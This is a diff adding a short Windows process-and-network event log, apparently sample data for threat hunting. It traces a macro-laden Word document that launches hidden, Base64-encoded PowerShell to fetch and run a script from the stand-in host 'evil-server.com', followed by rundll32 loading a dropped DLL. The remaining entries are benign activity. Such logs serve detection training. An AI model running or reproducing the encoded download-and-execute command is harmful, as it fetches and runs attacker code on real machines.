@@ -1,0 +1,17 @@
+06/01/2026 09:15:10 AM EventCode=1 User=john ParentImage=explorer.exe Image=WINWORD.EXE CommandLine="C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE invoice.docm"
+
+06/01/2026 09:15:18 AM EventCode=1 User=john ParentImage=WINWORD.EXE Image=cmd.exe CommandLine="cmd.exe /c powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygiaHR0cDovL2V2aWwtc2VydmVyLmNvbS9wYXlsb2FkLnBzMSIp"
+
+06/01/2026 09:15:21 AM EventCode=1 User=john ParentImage=cmd.exe Image=powershell.exe CommandLine="powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygiaHR0cDovL2V2aWwtc2VydmVyLmNvbS9wYXlsb2FkLnBzMSIp"
+
+06/01/2026 09:15:28 AM EventCode=3 User=john Process=powershell.exe DestinationIP=185.220.101.25 DestinationPort=443
+
+06/01/2026 09:15:35 AM EventCode=1 User=john ParentImage=powershell.exe Image=rundll32.exe CommandLine="rundll32.exe C:\Users\john\AppData\Local\Temp\update.dll,Start"
+
+06/01/2026 09:05:12 AM EventCode=1 User=sarah ParentImage=explorer.exe Image=WINWORD.EXE CommandLine="report.docx"
+
+06/01/2026 09:06:22 AM EventCode=1 User=sarah ParentImage=explorer.exe Image=chrome.exe CommandLine="chrome.exe"
+
+06/01/2026 09:10:44 AM EventCode=1 User=alex ParentImage=explorer.exe Image=notepad.exe CommandLine="notepad.exe"
+
+06/01/2026 09:30:18 AM EventCode=1 User=finance ParentImage=explorer.exe Image=EXCEL.EXE CommandLine="budget.xlsx"
